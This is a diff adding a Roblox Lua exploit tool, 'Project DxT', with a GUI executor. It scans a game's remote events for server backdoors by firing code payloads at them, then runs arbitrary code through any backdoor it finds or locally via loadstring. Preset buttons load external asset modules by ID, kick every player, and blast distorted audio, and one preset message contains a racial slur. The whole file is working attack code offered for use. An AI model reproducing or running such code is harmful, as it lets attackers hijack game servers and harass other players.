@@ -1,0 +1,534 @@
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local PlayerName = LocalPlayer.Name
+
+local function LoadAssetModule(assetId, key, name)
+    return {Pload = function() end} 
+end
+LoadAssetModule(0x308BC2E6B, 'Dummy', "'" .. PlayerName .. "'")
+
+local LMG2L = {};
+
+LMG2L["ScreenGui_1"] = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"));
+LMG2L["ScreenGui_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
+LMG2L["ScreenGui_1"]["ResetOnSpawn"] = false;
+
+LMG2L["TextLabel_2"] = Instance.new("TextLabel", LMG2L["ScreenGui_1"]);
+LMG2L["TextLabel_2"]["TextWrapped"] = true;
+LMG2L["TextLabel_2"]["BorderSizePixel"] = 0;
+LMG2L["TextLabel_2"]["TextScaled"] = true;
+LMG2L["TextLabel_2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextLabel_2"]["Size"] = UDim2.new(0, 238, 0, 90);
+LMG2L["TextLabel_2"]["Visible"] = false;
+LMG2L["TextLabel_2"]["Text"] = [[YOU KNOW? TS ONLY WORK IN BACKDOOR GAME NOT BYPASS ULTIMATE VERSION BY DXT]];
+LMG2L["TextLabel_2"]["Position"] = UDim2.new(0, 130, 0, 270);
+
+LMG2L["UIStroke_4"] = Instance.new("UIStroke", LMG2L["TextLabel_2"]);
+LMG2L["UIStroke_4"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+LMG2L["Frame_5"] = Instance.new("Frame", LMG2L["ScreenGui_1"]);
+LMG2L["Frame_5"]["BorderSizePixel"] = 0;
+LMG2L["Frame_5"]["AutoLocalize"] = false;
+LMG2L["Frame_5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Frame_5"]["Size"] = UDim2.new(0, 516, 0, 316);
+LMG2L["Frame_5"]["Position"] = UDim2.new(0.5, -258, 0.5, -158);
+
+LMG2L["Execute_6"] = Instance.new("TextButton", LMG2L["Frame_5"]);
+LMG2L["Execute_6"]["BorderSizePixel"] = 0;
+LMG2L["Execute_6"]["TextSize"] = 14;
+LMG2L["Execute_6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Execute_6"]["Size"] = UDim2.new(0, 108, 0, 62);
+LMG2L["Execute_6"]["Text"] = [[Execute]];
+LMG2L["Execute_6"]["Name"] = [[Execute]];
+LMG2L["Execute_6"]["Position"] = UDim2.new(0, 8, 0, 242);
+
+LMG2L["UIStroke_7"] = Instance.new("UIStroke", LMG2L["Execute_6"]);
+LMG2L["UIStroke_7"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+LMG2L["Execute Client_8"] = Instance.new("TextButton", LMG2L["Frame_5"]);
+LMG2L["Execute Client_8"]["BorderSizePixel"] = 0;
+LMG2L["Execute Client_8"]["TextSize"] = 10;
+LMG2L["Execute Client_8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Execute Client_8"]["Size"] = UDim2.new(0, 108, 0, 62);
+LMG2L["Execute Client_8"]["Text"] = [[Execute Client]];
+LMG2L["Execute Client_8"]["Name"] = [[Execute Client]];
+LMG2L["Execute Client_8"]["Position"] = UDim2.new(0, 120, 0, 242);
+
+LMG2L["UIStroke_9"] = Instance.new("UIStroke", LMG2L["Execute Client_8"]);
+LMG2L["UIStroke_9"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+LMG2L["UIStroke_a"] = Instance.new("UIStroke", LMG2L["Frame_5"]);
+
+LMG2L["Clear_b"] = Instance.new("TextButton", LMG2L["Frame_5"]);
+LMG2L["Clear_b"]["BorderSizePixel"] = 0;
+LMG2L["Clear_b"]["TextSize"] = 14;
+LMG2L["Clear_b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Clear_b"]["Size"] = UDim2.new(0, 108, 0, 62);
+LMG2L["Clear_b"]["Text"] = [[Clear]];
+LMG2L["Clear_b"]["Name"] = [[Clear]];
+LMG2L["Clear_b"]["Position"] = UDim2.new(0, 232, 0, 242);
+
+LMG2L["UIStroke_c"] = Instance.new("UIStroke", LMG2L["Clear_b"]);
+LMG2L["UIStroke_c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+LMG2L["TextLabel_d"] = Instance.new("TextLabel", LMG2L["Frame_5"]);
+LMG2L["TextLabel_d"]["BorderSizePixel"] = 0;
+LMG2L["TextLabel_d"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+LMG2L["TextLabel_d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextLabel_d"]["Size"] = UDim2.new(0, 314, 0, 16);
+LMG2L["TextLabel_d"]["Text"] = [[Project DxT]];
+
+LMG2L["ImageLabel_e"] = Instance.new("ImageLabel", LMG2L["TextLabel_d"]);
+LMG2L["ImageLabel_e"]["BorderSizePixel"] = 0;
+LMG2L["ImageLabel_e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["ImageLabel_e"]["Image"] = [[rbxassetid://130835138658335]];
+LMG2L["ImageLabel_e"]["Size"] = UDim2.new(0, 28, 0, 18);
+LMG2L["ImageLabel_e"]["Position"] = UDim2.new(0, 68, 0, 0);
+
+LMG2L["Inject_f"] = Instance.new("TextButton", LMG2L["Frame_5"]);
+LMG2L["Inject_f"]["BorderSizePixel"] = 0;
+LMG2L["Inject_f"]["TextSize"] = 14;
+LMG2L["Inject_f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Inject_f"]["Size"] = UDim2.new(0, 108, 0, 62);
+LMG2L["Inject_f"]["Text"] = [[Inject]];
+LMG2L["Inject_f"]["Name"] = [[Inject]];
+LMG2L["Inject_f"]["Position"] = UDim2.new(0, 344, 0, 242);
+
+LMG2L["UIStroke_10"] = Instance.new("UIStroke", LMG2L["Inject_f"]);
+LMG2L["UIStroke_10"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+LMG2L["R6_11"] = Instance.new("TextButton", LMG2L["Frame_5"]);
+LMG2L["R6_11"]["BorderSizePixel"] = 0;
+LMG2L["R6_11"]["TextSize"] = 14;
+LMG2L["R6_11"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["R6_11"]["Size"] = UDim2.new(0, 54, 0, 62);
+LMG2L["R6_11"]["Text"] = [[R6]];
+LMG2L["R6_11"]["Name"] = [[R6]];
+LMG2L["R6_11"]["Position"] = UDim2.new(0, 456, 0, 242);
+
+LMG2L["UIStroke_12"] = Instance.new("UIStroke", LMG2L["R6_11"]);
+LMG2L["UIStroke_12"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+LMG2L["TextBox_14"] = Instance.new("TextBox", LMG2L["Frame_5"]);
+LMG2L["TextBox_14"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+LMG2L["TextBox_14"]["BorderSizePixel"] = 0;
+LMG2L["TextBox_14"]["TextSize"] = 14;
+LMG2L["TextBox_14"]["TextYAlignment"] = Enum.TextYAlignment.Top;
+LMG2L["TextBox_14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextBox_14"]["RichText"] = true;
+LMG2L["TextBox_14"]["MultiLine"] = true;
+LMG2L["TextBox_14"]["ClearTextOnFocus"] = false;
+LMG2L["TextBox_14"]["ClipsDescendants"] = true;
+LMG2L["TextBox_14"]["PlaceholderText"] = [[SCRIPT HERE....]];
+LMG2L["TextBox_14"]["Size"] = UDim2.new(0, 408, 0, 216);
+LMG2L["TextBox_14"]["Position"] = UDim2.new(0, 8, 0, 20);
+LMG2L["TextBox_14"]["Text"] = [[Print("project DXT Ultimate Version")]];
+
+LMG2L["UIStroke_15"] = Instance.new("UIStroke", LMG2L["TextBox_14"]);
+LMG2L["UIStroke_15"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+LMG2L["UIDragDetector_16"] = Instance.new("UIDragDetector", LMG2L["Frame_5"]);
+
+LMG2L["ScrollingFrame_17"] = Instance.new("ScrollingFrame", LMG2L["Frame_5"]);
+LMG2L["ScrollingFrame_17"]["BorderSizePixel"] = 0;
+LMG2L["ScrollingFrame_17"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["ScrollingFrame_17"]["Size"] = UDim2.new(0, 92, 0, 216);
+LMG2L["ScrollingFrame_17"]["ScrollBarImageColor3"] = Color3.fromRGB(83, 83, 83);
+LMG2L["ScrollingFrame_17"]["Position"] = UDim2.new(0, 420, 0, 20);
+LMG2L["ScrollingFrame_17"]["CanvasSize"] = UDim2.new(0, 0, 0, 720);
+
+LMG2L["UIStroke_26"] = Instance.new("UIStroke", LMG2L["ScrollingFrame_17"]);
+LMG2L["UIStroke_26"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+LMG2L["Sugma_20"] = Instance.new("TextButton", LMG2L["ScrollingFrame_17"]);
+LMG2L["Sugma_20"]["BorderSizePixel"] = 0;
+LMG2L["Sugma_20"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Sugma_20"]["Size"] = UDim2.new(0, 76, 0, 50);
+LMG2L["Sugma_20"]["Text"] = [[Sugma]];
+LMG2L["Sugma_20"]["Name"] = [[Sugma]];
+LMG2L["Sugma_20"]["Position"] = UDim2.new(0, 2, 0, 2);
+
+LMG2L["UIStroke_21"] = Instance.new("UIStroke", LMG2L["Sugma_20"]);
+LMG2L["UIStroke_21"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+LMG2L["Happy Hub_29"] = Instance.new("TextButton", LMG2L["ScrollingFrame_17"]);
+LMG2L["Happy Hub_29"]["BorderSizePixel"] = 0;
+LMG2L["Happy Hub_29"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Happy Hub_29"]["Size"] = UDim2.new(0, 76, 0, 50);
+LMG2L["Happy Hub_29"]["Text"] = [[Happy Hub]];
+LMG2L["Happy Hub_29"]["Name"] = [[Happy Hub]];
+LMG2L["Happy Hub_29"]["Position"] = UDim2.new(0, 2, 0, 56);
+
+LMG2L["UIStroke_2a"] = Instance.new("UIStroke", LMG2L["Happy Hub_29"]);
+LMG2L["UIStroke_2a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+LMG2L["Noot Noot_24"] = Instance.new("TextButton", LMG2L["ScrollingFrame_17"]);
+LMG2L["Noot Noot_24"]["BorderSizePixel"] = 0;
+LMG2L["Noot Noot_24"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Noot Noot_24"]["Size"] = UDim2.new(0, 76, 0, 50);
+LMG2L["Noot Noot_24"]["Text"] = [[Noot Noot]];
+LMG2L["Noot Noot_24"]["Name"] = [[Noot Noot]];
+LMG2L["Noot Noot_24"]["Position"] = UDim2.new(0, 2, 0, 110);
+
+LMG2L["UIStroke_25"] = Instance.new("UIStroke", LMG2L["Noot Noot_24"]);
+LMG2L["UIStroke_25"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+LMG2L["Stop All Music_2f"] = Instance.new("TextButton", LMG2L["ScrollingFrame_17"]);
+LMG2L["Stop All Music_2f"]["BorderSizePixel"] = 0;
+LMG2L["Stop All Music_2f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Stop All Music_2f"]["Size"] = UDim2.new(0, 76, 0, 50);
+LMG2L["Stop All Music_2f"]["Text"] = [[Stop All Music]];
+LMG2L["Stop All Music_2f"]["Name"] = [[Stop All Music]];
+LMG2L["Stop All Music_2f"]["Position"] = UDim2.new(0, 2, 0, 164);
+
+LMG2L["UIStroke_30"] = Instance.new("UIStroke", LMG2L["Stop All Music_2f"]);
+LMG2L["UIStroke_30"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+LMG2L["Hint_2d"] = Instance.new("TextButton", LMG2L["ScrollingFrame_17"]);
+LMG2L["Hint_2d"]["BorderSizePixel"] = 0;
+LMG2L["Hint_2d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Hint_2d"]["Size"] = UDim2.new(0, 76, 0, 50);
+LMG2L["Hint_2d"]["Text"] = [[Hint]];
+LMG2L["Hint_2d"]["Name"] = [[Hint]];
+LMG2L["Hint_2d"]["Position"] = UDim2.new(0, 2, 0, 218);
+
+LMG2L["UIStroke_2e"] = Instance.new("UIStroke", LMG2L["Hint_2d"]);
+LMG2L["UIStroke_2e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+LMG2L["message_2b"] = Instance.new("TextButton", LMG2L["ScrollingFrame_17"]);
+LMG2L["message_2b"]["BorderSizePixel"] = 0;
+LMG2L["message_2b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["message_2b"]["Size"] = UDim2.new(0, 76, 0, 50);
+LMG2L["message_2b"]["Text"] = [[Message]];
+LMG2L["message_2b"]["Name"] = [[message]];
+LMG2L["message_2b"]["Position"] = UDim2.new(0, 2, 0, 272);
+
+LMG2L["UIStroke_2c"] = Instance.new("UIStroke", LMG2L["message_2b"]);
+LMG2L["UIStroke_2c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+LMG2L["Play Theme_18"] = Instance.new("TextButton", LMG2L["ScrollingFrame_17"]);
+LMG2L["Play Theme_18"]["BorderSizePixel"] = 0;
+LMG2L["Play Theme_18"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Play Theme_18"]["Size"] = UDim2.new(0, 76, 0, 50);
+LMG2L["Play Theme_18"]["Text"] = [[Play Theme]];
+LMG2L["Play Theme_18"]["Name"] = [[Play Theme]];
+LMG2L["Play Theme_18"]["Position"] = UDim2.new(0, 2, 0, 326);
+
+LMG2L["UIStroke_19"] = Instance.new("UIStroke", LMG2L["Play Theme_18"]);
+LMG2L["UIStroke_19"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+LMG2L["C00LGUI_22"] = Instance.new("TextButton", LMG2L["ScrollingFrame_17"]);
+LMG2L["C00LGUI_22"]["BorderSizePixel"] = 0;
+LMG2L["C00LGUI_22"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["C00LGUI_22"]["Size"] = UDim2.new(0, 76, 0, 50);
+LMG2L["C00LGUI_22"]["Text"] = [[C00LGUI]];
+LMG2L["C00LGUI_22"]["Name"] = [[C00LGUI]];
+LMG2L["C00LGUI_22"]["Position"] = UDim2.new(0, 2, 0, 382);
+
+LMG2L["UIStroke_23"] = Instance.new("UIStroke", LMG2L["C00LGUI_22"]);
+LMG2L["UIStroke_23"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+LMG2L["777ililo_1a"] = Instance.new("TextButton", LMG2L["ScrollingFrame_17"]);
+LMG2L["777ililo_1a"]["BorderSizePixel"] = 0;
+LMG2L["777ililo_1a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["777ililo_1a"]["Size"] = UDim2.new(0, 76, 0, 50);
+LMG2L["777ililo_1a"]["Text"] = [[777ililo]];
+LMG2L["777ililo_1a"]["Name"] = [[777ililo]];
+LMG2L["777ililo_1a"]["Position"] = UDim2.new(0, 2, 0, 436);
+
+LMG2L["UIStroke_1b"] = Instance.new("UIStroke", LMG2L["777ililo_1a"]);
+LMG2L["UIStroke_1b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+LMG2L["Kick All_1e"] = Instance.new("TextButton", LMG2L["ScrollingFrame_17"]);
+LMG2L["Kick All_1e"]["BorderSizePixel"] = 0;
+LMG2L["Kick All_1e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Kick All_1e"]["Size"] = UDim2.new(0, 76, 0, 50);
+LMG2L["Kick All_1e"]["Text"] = [[Kick All]];
+LMG2L["Kick All_1e"]["Name"] = [[Kick All]];
+LMG2L["Kick All_1e"]["Position"] = UDim2.new(0, 2, 0, 490);
+
+LMG2L["UIStroke_1f"] = Instance.new("UIStroke", LMG2L["Kick All_1e"]);
+LMG2L["UIStroke_1f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+LMG2L["Polaria_31"] = Instance.new("TextButton", LMG2L["ScrollingFrame_17"]);
+LMG2L["Polaria_31"]["BorderSizePixel"] = 0;
+LMG2L["Polaria_31"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Polaria_31"]["Size"] = UDim2.new(0, 76, 0, 50);
+LMG2L["Polaria_31"]["Text"] = [[Polaria]];
+LMG2L["Polaria_31"]["Name"] = [[Polaria]];
+LMG2L["Polaria_31"]["Position"] = UDim2.new(0, 2, 0, 544);
+
+LMG2L["UIStroke_32"] = Instance.new("UIStroke", LMG2L["Polaria_31"]);
+LMG2L["UIStroke_32"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+LMG2L["Primadon_27"] = Instance.new("TextButton", LMG2L["ScrollingFrame_17"]);
+LMG2L["Primadon_27"]["BorderSizePixel"] = 0;
+LMG2L["Primadon_27"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Primadon_27"]["Size"] = UDim2.new(0, 76, 0, 50);
+LMG2L["Primadon_27"]["Text"] = [[Primadon]];
+LMG2L["Primadon_27"]["Name"] = [[Primadon]];
+LMG2L["Primadon_27"]["Position"] = UDim2.new(0, 2, 0, 598);
+
+LMG2L["UIStroke_28"] = Instance.new("UIStroke", LMG2L["Primadon_27"]);
+LMG2L["UIStroke_28"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+LMG2L["Excavator_1c"] = Instance.new("TextButton", LMG2L["ScrollingFrame_17"]);
+LMG2L["Excavator_1c"]["BorderSizePixel"] = 0;
+LMG2L["Excavator_1c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Excavator_1c"]["Size"] = UDim2.new(0, 76, 0, 50);
+LMG2L["Excavator_1c"]["Text"] = [[Excavator]];
+LMG2L["Excavator_1c"]["Name"] = [[Excavator]];
+LMG2L["Excavator_1c"]["Position"] = UDim2.new(0, 2, 0, 652);
+
+LMG2L["UIStroke_1d"] = Instance.new("UIStroke", LMG2L["Excavator_1c"]);
+LMG2L["UIStroke_1d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+
+local foundBackdoors = {}
+local scanning = false
+
+local RS = game:GetService("ReplicatedStorage")
+
+local function waitFor(name, timeout)
+    local start = tick()
+    while tick() - start < timeout do
+        if workspace:FindFirstChild(name) then
+            return workspace[name]
+        end
+        task.wait()
+    end
+    return nil
+end
+
+local function scanBackdoor()
+    if scanning then return end
+    scanning = true
+
+    foundBackdoors = {}
+    LMG2L["Inject_f"].Text = "Injecting..."
+    LMG2L["Inject_f"].Active = false
+
+    local remotes = {}
+    for _, v in ipairs(RS:GetDescendants()) do
+        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
+            table.insert(remotes, v)
+        end
+    end
+
+    for _, remote in ipairs(remotes) do
+        if #foundBackdoors > 0 then break end
+
+        local uid = "DXT_TEST_" .. tick() .. "_" .. math.random(1000,9999)
+        local modelName = uid .. "_M"
+        local partName = uid .. "_P"
+
+        local modelPayload = 'Instance.new("Model", workspace).Name="'..modelName..'"'
+        local partPayload = 'Instance.new("Part", workspace).Name="'..partName..'"'
+
+        pcall(function()
+            if remote:IsA("RemoteEvent") then
+                remote:FireServer(modelPayload)
+            else
+                remote:InvokeServer(modelPayload)
+            end
+        end)
+
+        local model = waitFor(modelName, 2)
+        if not model then continue end
+
+        pcall(function()
+            if remote:IsA("RemoteEvent") then
+                remote:FireServer(partPayload)
+            else
+                remote:InvokeServer(partPayload)
+            end
+        end)
+
+        local part = waitFor(partName, 2)
+        if not part then
+            model:Destroy()
+            continue
+        end
+
+        table.insert(foundBackdoors, remote)
+        LMG2L["Inject_f"].Text = "Injected!"
+        break
+    end
+
+    if #foundBackdoors == 0 then
+        LMG2L["Inject_f"].Text = "No Backdoor"
+    end
+
+    LMG2L["Inject_f"].Active = true
+    scanning = false
+end
+
+LMG2L["Execute_6"].MouseButton1Click:Connect(function()
+    local cmd = LMG2L["TextBox_14"].Text
+    if cmd:gsub("%s","") == "" then return end
+
+    for _, bd in ipairs(foundBackdoors) do
+        pcall(function()
+            if bd:IsA("RemoteEvent") or bd:IsA("BindableEvent") then
+                bd:FireServer(cmd)
+            elseif bd:IsA("RemoteFunction") then
+                bd:InvokeServer(cmd)
+            end
+        end)
+    end
+end)
+
+LMG2L["Execute Client_8"].MouseButton1Click:Connect(function()
+    local cmd = LMG2L["TextBox_14"].Text
+    if cmd:gsub("%s","") == "" then return end
+
+    loadstring(cmd)()
+end)
+
+LMG2L["Clear_b"].MouseButton1Click:Connect(function()
+    LMG2L["TextBox_14"].Text = ""
+end)
+
+LMG2L["Sugma_20"].MouseButton1Click:Connect(function()
+    LMG2L["TextBox_14"].Text = 'require(11183244198):s("sugma", game.Players["'..PlayerName..'"])'
+end)
+
+LMG2L["Happy Hub_29"].MouseButton1Click:Connect(function()
+    LMG2L["TextBox_14"].Text = 'require(110047253067635):Hload("'..PlayerName..'")'
+end)
+
+LMG2L["Noot Noot_24"].MouseButton1Click:Connect(function()
+    LMG2L["TextBox_14"].Text = 'require(111968558943663):nooties("'..PlayerName..'")'
+end)
+
+LMG2L["Stop All Music_2f"].MouseButton1Click:Connect(function()
+    LMG2L["TextBox_14"].Text = [[for _, v in ipairs(game:GetDescendants()) do
+	if v:IsA("Sound") then
+		v:Stop()
+	end
+end]]
+end)
+
+LMG2L["Hint_2d"].MouseButton1Click:Connect(function()
+    LMG2L["TextBox_14"].Text = [[local hint = Instance.new("Hint")
+hint.Text = "SKIDDED BY PROJECT DXT"
+hint.Parent = workspace
+
+task.delay(3, function()
+	hint:Destroy()
+end)]]
+end)
+
+LMG2L["message_2b"].MouseButton1Click:Connect(function()
+    LMG2L["TextBox_14"].Text = [[local msg = Instance.new("Message")
+msg.Text = "ZACH WAS HERE KNIGGA KNIGGA "
+msg.Parent = workspace
+
+task.delay(3, function()
+	msg:Destroy()
+end)]]
+end)
+
+LMG2L["R6_11"].MouseButton1Click:Connect(function()
+    LMG2L["TextBox_14"].Text = 'require(9635947635).load("'..PlayerName..'")'
+end)
+
+LMG2L["Play Theme_18"].MouseButton1Click:Connect(function()
+    LMG2L["TextBox_14"].Text = [[--old theme
+local DxT = Instance.new("Sound")
+DxT.Name = "DxT"
+DxT.SoundId = "rbxassetid://1847661821"
+DxT.Volume = 67
+DxT.Looped = true
+DxT.PlaybackSpeed = 1.1
+DxT.Parent = workspace
+DxT.TimePosition = 0
+
+local distort = Instance.new("DistortionSoundEffect")
+distort.Level = 99
+distort.Parent = DxT
+
+DxT:Play()]]
+end)
+
+LMG2L["C00LGUI_22"].MouseButton1Click:Connect(function()
+    LMG2L["TextBox_14"].Text = 'require(14125553864):Fire("'..PlayerName..'", "c00lkidd")'
+end)
+
+LMG2L["777ililo_1a"].MouseButton1Click:Connect(function()
+    LMG2L["TextBox_14"].Text = 'require(134907549394378)("'..PlayerName..'")'
+end)
+
+LMG2L["Kick All_1e"].MouseButton1Click:Connect(function()
+    LMG2L["TextBox_14"].Text = [[local Players = game:GetService("Players")
+
+for _, plr in ipairs(Players:GetPlayers()) do
+    plr:Kick("Server Shutdowned LoL\nError Code: 267")
+end]]
+end)
+
+LMG2L["Polaria_31"].MouseButton1Click:Connect(function()
+    LMG2L["TextBox_14"].Text = 'require(93218599314854).Pload("'..PlayerName..'")'
+end)
+
+LMG2L["Primadon_27"].MouseButton1Click:Connect(function()
+    LMG2L["TextBox_14"].Text = 'require(94673163261524)("'..PlayerName..'")'
+end)
+
+LMG2L["Excavator_1c"].MouseButton1Click:Connect(function()
+    LMG2L["TextBox_14"].Text = 'require(16857604287)("'..PlayerName..'")'
+end)
+
+LMG2L["Inject_f"].MouseButton1Click:Connect(scanBackdoor)
+
+task.spawn(function()
+    LMG2L["TextLabel_2"].Visible = false
+    task.wait(2)
+    LMG2L["TextLabel_2"].Visible = true
+end)
+
+task.spawn(function()
+    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+    local oldGui = playerGui:FindFirstChild("LogoGui_Left")
+    if oldGui then oldGui:Destroy() end
+
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "LogoGui_Left"
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = playerGui
+
+    local logo = Instance.new("ImageLabel")
+    logo.Name = "GameLogo"
+    logo.Parent = screenGui
+    logo.BackgroundTransparency = 1
+    logo.Image = "rbxassetid://130835138658335"
+    logo.Size = UDim2.new(0, 80, 0, 80)
+    logo.AnchorPoint = Vector2.new(0.5, 0.5)
+    logo.Position = UDim2.new(0.5, 0, 0.5, 0)
+
+    local ring = Instance.new("ImageLabel")
+    ring.Name = "RainbowRing"
+    ring.Parent = logo
+    ring.BackgroundTransparency = 1
+    ring.Image = "rbxassetid://7102118272"
+    ring.Size = UDim2.new(0, 110, 0, 110)
+    ring.AnchorPoint = Vector2.new(0.5, 0.5)
+    ring.Position = UDim2.new(0.5, 0, 0.5, 0)
+    ring.ZIndex = logo.ZIndex - 1
+
+    local TweenService = game:GetService("TweenService")
+    local tweenInfo = TweenInfo.new(1.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+    local targetPosition = UDim2.new(0, 70, 1, -70)
+
+    task.wait(0.5)
+    TweenService:Create(logo, tweenInfo, {Position = targetPosition}):Play()
+
+    task.spawn(function()
+        local hue = 0
+        while task.wait(0.03) do
+            hue = (hue + 0.01) % 1
+            ring.Rotation = (ring.Rotation + 679) % 360
+            ring.ImageColor3 = Color3.fromHSV(hue, 1, 1)
+        end
+    end)
+end)
